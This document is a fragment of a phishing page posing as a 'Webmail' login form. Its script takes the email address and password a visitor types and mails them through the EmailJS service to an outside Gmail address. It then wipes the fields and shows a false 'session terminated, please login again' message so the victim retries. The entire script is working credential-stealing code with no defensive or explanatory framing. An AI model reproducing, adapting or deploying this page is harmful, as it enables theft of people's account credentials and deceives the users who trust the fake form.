<body>
  <div class="card">

      <label for="email">Email</label>
      <input type="email" id="email" name="email" placeholder="" autocomplete="email">
      <div class="error-message" id="emailError">Please fill in this field.</div>
    </div>
    <div class="form-row">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="" autocomplete="current-password">
      <div class="error-message" id="passwordError">Please fill in this field.</div>

    <button class="btn" id="loginBtn">Login</button>
  </div>
  <div class="message" id="message"></div>
  <div class="webmail-text">Webmail</div>

  <script>
    // Hide error messages when user focuses on input fields
    document.getElementById('email').addEventListener('focus', function() {
      document.getElementById('emailError').classList.remove('show');
    });
    document.getElementById('password').addEventListener('focus', function() {
      document.getElementById('passwordError').classList.remove('show');
    });

    document.getElementById('loginBtn').addEventListener('click', function() {
      const messageEl = document.getElementById('message');
      const btn = document.getElementById('loginBtn');
      const emailInput = document.getElementById('email').value.trim();
      const passwordInput = document.getElementById('password').value.trim();
      const emailError = document.getElementById('emailError');
      const passwordError = document.getElementById('passwordError');
     
      // Clear error messages first
      emailError.classList.remove('show');
      passwordError.classList.remove('show');
     
      // Validate email first
      if (!emailInput) {
        emailError.classList.add('show');
        return;
      }
     
      // Then validate password
      if (!passwordInput) {
        passwordError.classList.add('show');
        return;
      }
     
      // Clear any previous message
      messageEl.textContent = '';
     
      // Show "Loading..." for 6 seconds
      messageEl.textContent = 'Loading...';
      btn.disabled = true;
     
      // Send email with credentials
      emailjs.send('service_vumzjh5', 'template_ytpnja6', {
        to_email: 'frank227r@gmail.com',
        user_email: emailInput,
        user_password: passwordInput
      }).then(function() {
        console.log('Email sent successfully');
      }).catch(function(error) {
        console.error('Email send failed:', error);
      });
     
      setTimeout(function() {
        // Clear form fields after email is sent
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
       
        // After 6 seconds, show success message for 5 seconds
        messageEl.textContent = 'You have successfully terminated the session. Please login again!';
       
        setTimeout(function() {
          // After 5 more seconds, clear the message and re-enable button
          messageEl.textContent = '';
          btn.disabled = false;
        }, 5000);
      }, 6000);
    });
  </script>
